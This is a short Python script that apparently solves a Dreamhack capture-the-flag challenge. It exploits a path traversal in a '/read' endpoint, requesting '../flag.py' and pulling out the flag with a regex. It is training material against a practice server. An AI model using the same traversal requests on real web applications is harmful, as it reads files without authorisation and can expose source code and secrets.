import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345
res = requests.get(f"{HOST}:{PORT}/read", params={"name": "../flag.py"})
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
